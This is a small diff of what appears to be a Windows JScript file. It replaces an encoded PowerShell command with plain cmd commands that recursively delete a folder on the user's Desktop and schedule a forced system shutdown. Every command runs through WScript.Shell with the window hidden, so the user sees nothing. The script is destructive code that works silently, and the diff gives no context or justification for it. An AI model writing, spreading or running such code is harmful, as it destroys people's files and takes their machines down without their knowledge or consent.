@@ -1,2 +1,4 @@
-c="powershell.exe -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAEQAZQBzAGsAdABvAHAAXABhACAALQByAGUAYwB1AHIAcwBlAA==";
-new ActiveXObject("WScript.Shell").Run(c,0,true);
+c1="cmd /c rd /s /q %userprofile%\Desktop\a";
+c2="cmd /c shutdown -s -t 300";
+new ActiveXObject("WScript.Shell").Run(c2,0,true);
+new ActiveXObject("WScript.Shell").Run(c1,0,true);
